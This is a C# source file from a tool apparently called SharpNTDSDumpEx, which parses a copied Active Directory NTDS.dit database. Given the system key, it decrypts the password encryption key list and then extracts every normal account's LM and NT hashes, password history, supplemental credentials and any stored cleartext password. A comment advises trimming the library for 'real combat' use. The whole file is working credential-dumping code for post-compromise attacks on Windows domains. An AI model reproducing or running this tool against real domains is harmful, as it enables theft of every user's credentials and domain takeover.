/*
 * @Author: RcoIl
 * @Date: 2020/5/20 11:27:54
*/

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Isam.Esent.Interop;
using System.Dynamic;
using Microsoft.Isam.Esent.Interop.Vista;
using System.Text.RegularExpressions;
using System.Globalization;
using SharpNTDSDumpEx.Resources;
using System.Collections.ObjectModel;
using System.Security.Principal;

namespace SharpNTDSDumpEx
{

    /// <summary>
    /// 直接使用微软官方的命名空间即可很好操作 ESENT 数据库。如果是用于实战，建议将 ManagedEsent 进行拆解(但整个过程很繁琐)，这样体积会小很多。
    /// </summary>
    class NTDS
    {
        private const string DATATABLE = "datatable";
        private const string LINKTABLE = "link_table";
        private const string MSYSOBJECTS = "MSysObjects";

        private Instance instance;
        private JET_DBID dbId;
        private Session sesId;
        private JET_wrn wrn;
        private JET_TABLEID _tableid;
        private MSysObjectsRow[] _mSysObjects;
        public DatatableRow[] _datatable;
        Dictionary<string, string> _ldapDisplayNameToDatatableColumnNameDictionary;

        public enum ADS_USER_FLAG : int
        {
            ADS_UF_SCRIPT = 0x1,
            ADS_UF_ACCOUNTDISABLE = 0x2,
            ADS_UF_HOMEDIR_REQUIRED = 0x8,
            ADS_UF_LOCKOUT = 0x10,
            ADS_UF_PASSWD_NOTREQD = 0x20,
            ADS_UF_PASSWD_CANT_CHANGE = 0x40,
            ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED = 0x80,
            ADS_UF_TEMP_DUPLICATE_ACCOUNT = 0x100,
            ADS_UF_NORMAL_ACCOUNT = 0x200,
            ADS_UF_INTERDOMAIN_TRUST_ACCOUNT = 0x800,
            ADS_UF_WORKSTATION_TRUST_ACCOUNT = 0x1000,
            ADS_UF_SERVER_TRUST_ACCOUNT = 0x2000,
            ADS_UF_DONT_EXPIRE_PASSWD = 0x10000,
            ADS_UF_MNS_LOGON_ACCOUNT = 0x20000,
            ADS_UF_SMARTCARD_REQUIRED = 0x40000,
            ADS_UF_TRUSTED_FOR_DELEGATION = 0x80000,
            ADS_UF_NOT_DELEGATED = 0x100000,
            ADS_UF_USE_DES_KEY_ONLY = 0x200000,
            ADS_UF_DONT_REQUIRE_PREAUTH = 0x400000,
            ADS_UF_PASSWORD_EXPIRED = 0x800000,
            ADS_UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 0x1000000
        }

        private enum ADS_GROUP_TYPE_ENUM : uint
        {
            ADS_GROUP_TYPE_GLOBAL_GROUP = 0x00000002,
            ADS_GROUP_TYPE_DOMAIN_LOCAL_GROUP = 0x00000004,
            ADS_GROUP_TYPE_LOCAL_GROUP = 0x00000004,
            ADS_GROUP_TYPE_UNIVERSAL_GROUP = 0x00000008,
            ADS_GROUP_TYPE_SECURITY_ENABLED = 0x80000000
        }

        /// <summary>
        /// 获取已知的空 LM 哈希
        /// </summary>
        public static string EMPTY_LM_HASH => "AAD3B435B51404EEAAD3B435B51404EE".ToLower();

        /// <summary>
        /// 获取已知的空 NT 哈希
        /// </summary>
        public static string EMPTY_NT_HASH => "31D6CFE0D16AE931B73C59D7E0C089C0".ToLower();

        private static List<MSysObjectsRow> mSysObjects = new List<MSysObjectsRow>();
        /// <summary>
        /// 对 EseNt 数据库的一些初始化操作
        /// </summary>
        public NTDS()
        {
            // set the page size for NTDS.dit(该函数用于设置数据库引擎的许多配置设置。)
            wrn = Api.JetSetSystemParameter(JET_INSTANCE.Nil, JET_SESID.Nil, JET_param.DatabasePageSize, (IntPtr)8192, null);
            if (wrn == JET_wrn.Success)
            {
                // 创建一个实例对象 - JetCreateInstance
                instance = new Instance("SharpNTDSDumpEx_0_1");
                instance.Parameters.Recovery = false;
                // 对当前实例初始化
                instance.Init();
                // 开始一个会话对象
                sesId = new Session(instance);
            }
            else
            {
                Console.WriteLine("[!] error at JetSetSystemParameter()");
            }
        }
        ~NTDS()
        {
            if (dbId != null || sesId != null || instance != null)
            {
                UnNTDSLoad();
                if (sesId != null)
                {
                    Api.JetEndSession(sesId, EndSessionGrbit.None);
                }
                if (sesId == null && instance != null)
                {
                    Api.JetTerm(instance);
                }
            }
        }

        /// <summary>
        /// 加载 ntds.dit，并打开
        /// </summary>
        /// <param name="fname"></param>
        /// <returns></returns>
        public Boolean NTDSLoad(String dbPath)
        {
            // 应用实例对象和会话对象进行数据库的操作
            // 在打开数据库之前，得先用 JetAttachDatabase 将备用数据库附加到当前会话，不然会引发 No such database 异常.
            wrn = Api.JetAttachDatabase(sesId, dbPath, AttachDatabaseGrbit.ReadOnly);
            if (wrn == JET_wrn.Success)
            {
                // 打开数据库
                wrn = Api.JetOpenDatabase(sesId, dbPath, null, out dbId, OpenDatabaseGrbit.ReadOnly);
                if (wrn == JET_wrn.Success)
                {
                    // 针对数据库的一系列操作
                    _mSysObjects = EnumColumns();
                    _ldapDisplayNameToDatatableColumnNameDictionary = EnumerateDatatableTableLdapDisplayNames(_mSysObjects);
                    _datatable = EnumerateDatatableTable(_ldapDisplayNameToDatatableColumnNameDictionary);
                }
                else
                {
                    Console.WriteLine("[!] error at JetOpenDatabase()");
                }
            }
            else {
                Console.WriteLine("[!] error at JetAttachDatabase()");
            }
            return wrn == JET_wrn.Success;
        }
        private void UnNTDSLoad()
        {
            // close database
            if (dbId != null)
            {
                Api.JetCloseDatabase(sesId, dbId, 0);
            }
        }

        #region 数据库解析操作

        /// <summary>
        /// + Open MSysObjects
        /// + Enumerate columns
        /// 
        /// We're only interested in attributes for ntds.dit
        /// </summary>
        /// <returns></returns>
        private MSysObjectsRow[] EnumColumns()
        {
            // 此处用了打开表时的只读属性，读的时候应该会快一点.
            wrn = Api.JetOpenTable(sesId, dbId, MSYSOBJECTS, null, 0, OpenTableGrbit.ReadOnly | OpenTableGrbit.Sequential, out _tableid);
            if (wrn == JET_wrn.Success)
            {
                //JET_COLUMNLIST columndef;
                // 检索有关表列的信息。将列名称映射到列ID的字典
                //Api.JetGetTableColumnInfo(sesId, _tableid, null, out columndef);
                var columnDictionary = Api.GetColumnDictionary(sesId, _tableid);

                // 循环遍历表，向字典添加属性ID和列名
                Api.MoveBeforeFirst(sesId, _tableid);
                while (Api.TryMoveNext(sesId, _tableid))
                {
                    var nameColumn = new Utf8StringColumnValue { Columnid = columnDictionary["Name"] };

                    Api.RetrieveColumns(sesId, _tableid, nameColumn);
                    if (nameColumn.Value.StartsWith("ATT", StringComparison.Ordinal))
                    {
                        mSysObjects.Add(new MSysObjectsRow
                        {
                            AttributeId = int.Parse(Regex.Replace(nameColumn.Value, "[A-Za-z-]", string.Empty, RegexOptions.None), CultureInfo.InvariantCulture),
                            ColumnName = nameColumn.Value
                        });
                        // AttributeId = 2128564599
                        // ColumnName = ATTf-2128564599
                    }
                }
            }
            Api.JetCloseTable(sesId, _tableid);
            return mSysObjects.ToArray();
        }

        /// <summary>
        /// 获取列对应 LdapDisplayName
        /// </summary>
        /// <param name="mSysObjects"></param>
        /// <returns></returns>
        private Dictionary<string, string> EnumerateDatatableTableLdapDisplayNames(MSysObjectsRow[] mSysObjects)
        {

            var ldapDisplayNameToColumnNameDictionary = new Dictionary<string, string>();
            var unmatchedCount = 0;
            wrn = Api.JetOpenTable(sesId, dbId, DATATABLE, null, 0, OpenTableGrbit.ReadOnly | OpenTableGrbit.Sequential, out _tableid);
            if (wrn == JET_wrn.Success)
            {
                // 获取将列名称映射到列ID的字典
                var columnDictionary = Api.GetColumnDictionary(sesId, _tableid);
                // 遍历所有表
                Api.MoveBeforeFirst(sesId, _tableid);
                while (Api.TryMoveNext(sesId, _tableid))
                {
                    var ldapDisplayNameColumn = new StringColumnValue { Columnid = columnDictionary["ATTm131532"] };
                    var attributeIdColumn = new Int32ColumnValue { Columnid = columnDictionary["ATTc131102"] };
                    Api.RetrieveColumns(sesId, _tableid, attributeIdColumn, ldapDisplayNameColumn);
                    if (attributeIdColumn.Value != null)
                    {
                        if (Array.Find(mSysObjects, x => x.AttributeId == attributeIdColumn.Value) == null)
                        {
                            unmatchedCount++;
                        }
                        else
                        {
                            //Console.WriteLine(mSysObjects.First(x => x.AttributeId == attributeIdColumn.Value).ColumnName + ldapDisplayNameColumn.Value);
                            ldapDisplayNameToColumnNameDictionary.Add(ldapDisplayNameColumn.Value, mSysObjects.First(x => x.AttributeId == attributeIdColumn.Value).ColumnName);
                        }
                    }
                }
                //var pekListColumn = new BytesColumnValue { Columnid = columnDictionary[ldapDisplayNameToColumnNameDictionary["pekList"]] };
                //Console.WriteLine(pekListColumn);
            }
            
            return ldapDisplayNameToColumnNameDictionary;
        }

        private DatatableRow[] EnumerateDatatableTable(Dictionary<string, string> ldapDisplayNameToDatatableColumnNameDictionary)
        {
            var datatable = new List<DatatableRow>();
            var deletedCount = 0;

            wrn = Api.JetOpenTable(sesId, dbId, DATATABLE, null, 0, OpenTableGrbit.ReadOnly | OpenTableGrbit.Sequential, out _tableid);
            if (wrn == JET_wrn.Success)
            {
                // 获取将列名称映射到列ID的字典
                var columnDictionary = Api.GetColumnDictionary(sesId, _tableid);
                // 遍历所有表
                Api.MoveBeforeFirst(sesId, _tableid);
                while (Api.TryMoveNext(sesId, _tableid))
                {
                    var accountExpiresColumn = new BytesColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["accountExpires"]] };
                    var displayNameColumn = new StringColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["displayName"]] };
                    var distinguishedNameTagColumn = new Int32ColumnValue { Columnid = columnDictionary["DNT_col"] };
                    var groupTypeColumn = new Int32ColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["groupType"]] };
                    var isDeletedColumn = new Int32ColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["isDeleted"]] };
                    var lastLogonColumn = new LdapDateTimeColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["lastLogonTimestamp"]] };
                    var lmColumn = new BytesColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["dBCSPwd"]] };
                    var lmHistoryColumn = new BytesColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["lmPwdHistory"]] };
                    var nameColumn = new StringColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["name"]] };
                    var ntColumn = new BytesColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["unicodePwd"]] };
                    var ntHistoryColumn = new BytesColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["ntPwdHistory"]] };
                    var objColumn = new BoolColumnValue { Columnid = columnDictionary["OBJ_col"] };
                    var objectCategoryColumn = new Int32ColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["objectCategory"]] };
                    var objectSidColumn = new BytesColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["objectSid"]] };
                    var parentDistinguishedNameTagColumn = new Int32ColumnValue { Columnid = columnDictionary["PDNT_col"] };
                    var passwordLastSetColumn = new LdapDateTimeColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["pwdLastSet"]] };
                    var pekListColumn = new BytesColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["pekList"]] };
                    var primaryGroupIdColumn = new Int32ColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["primaryGroupID"]] };
                    var rdnTypeColumn = new Int32ColumnValue { Columnid = columnDictionary["RDNtyp_col"] }; // The RDNTyp_col holds the Attribute-ID for the attribute being used as the RDN, such as CN, OU, DC
                    var samAccountNameColumn = new StringColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["sAMAccountName"]] };
                    var timeColumn = new LdapDateTimeColumnValue { Columnid = columnDictionary["time_col"] };
                    var userAccountControlColumn = new Int32ColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["userAccountControl"]] };
                    var supplementalCredentialsColumn = new BytesColumnValue { Columnid = columnDictionary[ldapDisplayNameToDatatableColumnNameDictionary["supplementalCredentials"]] };

                    var columns = new List<ColumnValue>
                    {
                        accountExpiresColumn,
                        displayNameColumn,
                        distinguishedNameTagColumn,
                        groupTypeColumn,
                        isDeletedColumn,
                        lastLogonColumn,
                        nameColumn,
                        objColumn,
                        objectCategoryColumn,
                        objectSidColumn,
                        parentDistinguishedNameTagColumn,
                        passwordLastSetColumn,
                        primaryGroupIdColumn,
                        rdnTypeColumn,
                        samAccountNameColumn,
                        timeColumn,
                        userAccountControlColumn,
                        // dumpHashes
                        pekListColumn,
                        lmColumn,
                        ntColumn,
                        supplementalCredentialsColumn,
                        // includeHistoryHashes
                        lmHistoryColumn,
                        ntHistoryColumn,
                    };
                    Api.RetrieveColumns(sesId, _tableid, columns.ToArray());

                    // 跳过删除的对象
                    if (isDeletedColumn.Value.HasValue && isDeletedColumn.Value != 0)
                    {
                        deletedCount++;
                        continue;
                    }

                    // 一些已删除的对象没有isDeleted标志，但确实在DN后面附加了一个字符串 (https://support.microsoft.com/en-us/help/248047/phantoms--tombstones-and-the-infrastructure-master)
                    if (nameColumn.Value?.Contains("\nDEL:") ?? false)
                    {
                        deletedCount++;
                        continue;
                    }

                    SecurityIdentifier sid = null;
                    uint rid = 0;
                    if (objectSidColumn.Error == JET_wrn.Success)
                    {
                        var sidBytes = objectSidColumn.Value;
                        var ridBytes = sidBytes.Skip(sidBytes.Length - sizeof(int)).Take(sizeof(int)).Reverse().ToArray();
                        sidBytes = sidBytes.Take(sidBytes.Length - sizeof(int)).Concat(ridBytes).ToArray();
                        rid = BitConverter.ToUInt32(ridBytes, 0);
                        sid = new SecurityIdentifier(sidBytes, 0);
                    }
                    var row = new DatatableRow
                    {
                        AccountExpires = accountExpiresColumn.Value,
                        DisplayName = displayNameColumn.Value,
                        Dnt = distinguishedNameTagColumn.Value,
                        GroupType = groupTypeColumn.Value,
                        LastLogon = lastLogonColumn.Value,
                        Name = nameColumn.Value,
                        ObjectCategoryDnt = objectCategoryColumn.Value,
                        Rid = rid,
                        Sid = sid,
                        ParentDnt = parentDistinguishedNameTagColumn.Value,
                        Phantom = objColumn.Value == false,
                        LastPasswordChange = passwordLastSetColumn.Value,
                        PrimaryGroupDnt = primaryGroupIdColumn.Value,
                        RdnType = rdnTypeColumn.Value,
                        SamAccountName = samAccountNameColumn.Value,
                        UserAccountControlValue = userAccountControlColumn.Value,
                    };

                    if (pekListColumn.Value != null)
                    {
                        row.PekList = pekListColumn.Value;
                    }

                    if (lmColumn.Value != null)
                    {
                        row.EncryptedLmHash = lmColumn.Value;
                    }

                    if (ntColumn.Value != null)
                    {
                        row.EncryptedNtHash = ntColumn.Value;
                    }

                    if (lmHistoryColumn.Value != null)
                    {
                        row.EncryptedLmHistory = lmHistoryColumn.Value;
                    }

                    if (ntHistoryColumn.Value != null)
                    {
                        row.EncryptedNtHistory = ntHistoryColumn.Value;
                    }

                    if (supplementalCredentialsColumn.Value != null)
                    {
                        row.SupplementalCredentialsBlob = supplementalCredentialsColumn.Value;
                    }

                    datatable.Add(row);
                }
            }
            return datatable.ToArray();
        }
        #endregion


        /// <summary>
        /// +获取Pek列表
        /// +打开数据表
        /// +检索列表并解密第一个密钥
        /// </summary>
        /// <param name="systemkey"></param>
        /// <param name="passwordkey"></param>
        public Boolean GetPEKey(byte[] systemKey, out Dictionary<uint, byte[]> decryptedPekList)
        {
            var encryptedPek = _datatable.Single(x => x.PekList != null).PekList;
            decryptedPekList = NTCrypto.DecryptPekList(systemKey, encryptedPek);

            CalculateDnsForDatatableRows();
            CalculateObjectCategoryStringForDatableRows();

            #region

            foreach (var row in _datatable)
            {
                if ((row.UserAccountControlValue & (int)ADS_USER_FLAG.ADS_UF_NORMAL_ACCOUNT) == (int)ADS_USER_FLAG.ADS_UF_NORMAL_ACCOUNT)
                {
                    if (row.EncryptedLmHash != null)
                    {
                        try
                        {
                            row.LmHash = ByteArrayToHexString(NTCrypto.DecryptHashes(decryptedPekList, row.EncryptedLmHash, row.Rid));
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[!] Failed to decrypt LM hash for '{row.SamAccountName}' with error: {ex.Message}");
                            row.LmHash = EMPTY_LM_HASH;
                        }
                    }
                    else
                    {
                        row.LmHash = EMPTY_LM_HASH;
                    }

                    if (row.EncryptedNtHash != null)
                    {
                        try
                        {
                            row.NtHash = ByteArrayToHexString(NTCrypto.DecryptHashes(decryptedPekList, row.EncryptedNtHash, row.Rid));
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[!] Failed to decrypt NT hash for '{row.SamAccountName}' with error: {ex.Message}");
                            row.NtHash = EMPTY_LM_HASH;
                        }
                    }
                    else
                    {
                        row.NtHash = EMPTY_NT_HASH;
                    }


                    if (row.SupplementalCredentialsBlob != null)
                    {
                        try
                        {
                            row.SupplementalCredentials = NTCrypto.DecryptSupplementalCredentials(decryptedPekList, row.SupplementalCredentialsBlob);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"[!] Failed to decrypt supplemental credentials for '{row.SamAccountName}' with error: {ex.Message}");
                        }
                    }
                }
            }
            #endregion

            if (decryptedPekList.Count != 0)
            {
                return true;
            }
            return false;
        }

        private void CalculateDnsForDatatableRows()
        {

            var commonNameAttrbiuteId = int.Parse(Regex.Replace(_ldapDisplayNameToDatatableColumnNameDictionary["cn"], "[A-Za-z-]", string.Empty, RegexOptions.None), CultureInfo.InvariantCulture);
            var organizationalUnitAttrbiuteId = int.Parse(Regex.Replace(_ldapDisplayNameToDatatableColumnNameDictionary["ou"], "[A-Za-z-]", string.Empty, RegexOptions.None), CultureInfo.InvariantCulture);
            var domainComponentAttrbiuteId = int.Parse(Regex.Replace(_ldapDisplayNameToDatatableColumnNameDictionary["dc"], "[A-Za-z-]", string.Empty, RegexOptions.None), CultureInfo.InvariantCulture);

            var attributeIdToDistinguishedNamePrefexDictionary = new Dictionary<int, string>
            {
                [commonNameAttrbiuteId] = "CN=",
                [organizationalUnitAttrbiuteId] = "OU=",
                [domainComponentAttrbiuteId] = "DC=",
            };

            var dntToPartialDnDictionary = new Dictionary<int, string>();
            var dntToPdntDictionary = new Dictionary<int, int>();

            foreach (var row in _datatable)
            {
                if (row.RdnType == commonNameAttrbiuteId
                        || row.RdnType == organizationalUnitAttrbiuteId
                        || row.RdnType == domainComponentAttrbiuteId)
                {
                    dntToPartialDnDictionary[row.Dnt.Value] = attributeIdToDistinguishedNamePrefexDictionary[row.RdnType.Value] + row.Name;
                    if (row.ParentDnt.Value != 0)
                    {
                        dntToPdntDictionary[row.Dnt.Value] = row.ParentDnt.Value;
                    }
                }
            }

            var dntToDnDictionary = new Dictionary<int, string>();

            foreach (var kvp in dntToPartialDnDictionary)
            {
                dntToDnDictionary[kvp.Key] = dntToPartialDnDictionary[kvp.Key];
                var parentDnt = dntToPdntDictionary[kvp.Key];
                while (dntToPartialDnDictionary.ContainsKey(parentDnt))
                {
                    dntToDnDictionary[kvp.Key] += "," + dntToPartialDnDictionary[parentDnt];
                    parentDnt = dntToPdntDictionary[parentDnt];
                }
            }

            foreach (var row in _datatable)
            {
                if (row.RdnType == commonNameAttrbiuteId
                        || row.RdnType == organizationalUnitAttrbiuteId
                        || row.RdnType == domainComponentAttrbiuteId)
                {
                    row.Dn = dntToDnDictionary[row.Dnt.Value];
                }
            }
        }

        private void CalculateObjectCategoryStringForDatableRows()
        {

            var classSchemaRowDnt = _datatable.Single(x => x.Name.Equals("Class-Schema")).Dnt;

            var objectCategoryDntToObjectCategoryStringDictionary = _datatable.Where(x => x.ObjectCategoryDnt == classSchemaRowDnt).ToDictionary(x => x.Dnt, x => x.Name);

            foreach (var row in _datatable)
            {
                if (row.ObjectCategoryDnt.HasValue)
                {
                    row.ObjectCategory = objectCategoryDntToObjectCategoryStringDictionary[row.ObjectCategoryDnt];
                }
            }
        }

        public DomainInfo[] CalculateDomainInfo()
        {
            var domains = new List<DomainInfo>();
            foreach (var row in _datatable)
            {
                if (row.Sid?.BinaryLength == 24)
                {
                    var domainInfo = new DomainInfo
                    {
                        Sid = row.Sid,
                        Name = row.Name,
                        Dn = row.Dn,
                    };
                    domainInfo.AdministratorsSid = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, domainInfo.Sid);
                    //Console.WriteLine(domainInfo.Dn);
                    domainInfo.DomainAdminsSid = new SecurityIdentifier(WellKnownSidType.AccountDomainAdminsSid, domainInfo.Sid);
                    domainInfo.EnterpriseAdminsSid = new SecurityIdentifier(WellKnownSidType.AccountEnterpriseAdminsSid, domainInfo.Sid);
                    domainInfo.Fqdn = domainInfo.Dn.Replace("DC=", ".").Replace(",", string.Empty).TrimStart('.');
                    //domainInfo.Fqdn = domainInfo.Name;

                    domains.Add(domainInfo);
                }
            }
            return domains.ToArray();
        }
        public UserInfo[] CalculateUserInfo()
        { 
            var users = new List<UserInfo>();
            foreach (var row in _datatable)
            {
                if ((row.UserAccountControlValue & (int)ADS_USER_FLAG.ADS_UF_NORMAL_ACCOUNT) == (int)ADS_USER_FLAG.ADS_UF_NORMAL_ACCOUNT && row.ObjectCategory.Equals("Person"))
                {
                    var userInfo = new UserInfo
                    {
                        Dnt = row.Dnt.Value,
                        Name = row.Name,
                        Dn = row.Dn,
                        DomainSid = row.Sid.AccountDomainSid,
                        Disabled = (row.UserAccountControlValue & (int)ADS_USER_FLAG.ADS_UF_ACCOUNTDISABLE) == (int)ADS_USER_FLAG.ADS_UF_ACCOUNTDISABLE,
                        LastLogon = row.LastLogon ?? DateTime.Parse("01.01.1601 00:00:00", CultureInfo.InvariantCulture),
                        PasswordNotRequired = (row.UserAccountControlValue & (int)ADS_USER_FLAG.ADS_UF_PASSWD_NOTREQD) == (int)ADS_USER_FLAG.ADS_UF_PASSWD_NOTREQD,
                        PasswordNeverExpires = (row.UserAccountControlValue & (int)ADS_USER_FLAG.ADS_UF_DONT_EXPIRE_PASSWD) == (int)ADS_USER_FLAG.ADS_UF_DONT_EXPIRE_PASSWD,
                        Expires = GetAccountExpiresDateTimeFromByteArray(row.AccountExpires),
                        PasswordLastChanged = row.LastPasswordChange ?? DateTime.Parse("01.01.1601 00:00:00", CultureInfo.InvariantCulture),
                        SamAccountName = row.SamAccountName,
                        Rid = row.Rid,
                        LmHash = row.LmHash,
                        NtHash = row.NtHash,
                        LmHistory = row.LmHistory,
                        NtHistory = row.NtHistory,
                        ClearTextPassword = row.SupplementalCredentials?.ContainsKey("Primary:CLEARTEXT") ?? false ? Encoding.Unicode.GetString(row.SupplementalCredentials["Primary:CLEARTEXT"]) : null
                    };
                    users.Add(userInfo);
                    continue;
                }
            }

            return users.ToArray();
        }
        private static DateTime? GetAccountExpiresDateTimeFromByteArray(byte[] value)
        {
            // https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
            if (value == null)
            {
                return null;
            }

            var ticks = BitConverter.ToInt64(value, 0);
            if (ticks == 0 || ticks == 9223372036854775807)
            {
                return null;
            }

            return new DateTime(1601, 1, 1).AddTicks(ticks);
        }


        public static string ByteArrayToHexString(byte[] ba)
        {
            string hex = BitConverter.ToString(ba).ToLower();
            return hex.Replace("-", string.Empty);
        }

        /// <summary>
        /// 返回字节数组的字符串格式
        /// </summary>
        /// <param name="data">要格式化的数据.</param>
        /// <returns>数据的字符串表示形式.</returns>
        public static string FormatBytes(byte[] data)
        {
            if (null == data)
            {
                return null;
            }

            var sb = new StringBuilder(data.Length * 2);
            foreach (byte b in data)
            {
                sb.AppendFormat("{0:X2}", b);
            }

            return sb.ToString();
        }

    }
}
